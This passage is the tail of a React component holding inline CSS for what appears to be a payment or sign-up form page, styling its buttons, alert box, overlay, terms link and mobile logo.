        width: 27px;
    }
    .footer-content .social-links div#knet-fb {
        background: url(../images/knet-links.png) -120px 0 no-repeat;
        width: 27px;
    }
    button {
        width: 100%;
    }
    .submit-button {
        background-color: #eaeaea;
        border: 1px solid #cacaca;
        padding: 5px 0;
        font-weight: bold;
        color: #666666;
      width:50%;
      float:left;
      height:27px;
      border-radius:4px;
    }
    .cancel-button {
        background-color: #eaeaea;
        border: 1px solid #cacaca;
        padding: 5px 0;
        font-weight: bold;
        color: #666666;
      width:50%;
      height:27px;
      border-radius:4px;
      -webkit-appearance:none;
    }
    .row.alert-msg {
        font-size: 12px;
        text-align: justify;
        background-color: #d9edf6;
        padding: 10px !important;
        border: 1px solid #bacce0;
        border-radius: 4px;
        margin-bottom: 10px;
    }
    @media all and (max-width:425px) {
        .content-block {
            width: 98%;
            margin: 0 auto;
        }
    }
    .overlay {
        background: #555555;
        display: none;        
        position: absolute;   
        top: 0;               
        right: 0;             
        bottom: 0;
        left: 0;
        opacity: 0.5;
    }
    .terms {
      font-size: 11px;
      color: #0070cd;
      font-weight: bold; 
      font-style: italic;
      text-decoration:none;
    }
    .paymentOption {
      vertical-align: super;
    }
    .container-blogo{
      width:100%;
      margin-top:-5px;
      margin-bottom:15px;
    }
    .logoHead-mob{
       width:42%; 
       margin-left:27%; 
      /* width:16%;
      margin-left:40%; */
      margin-right:auto;
    }
  `}
      </style>
    </div>
  )
}

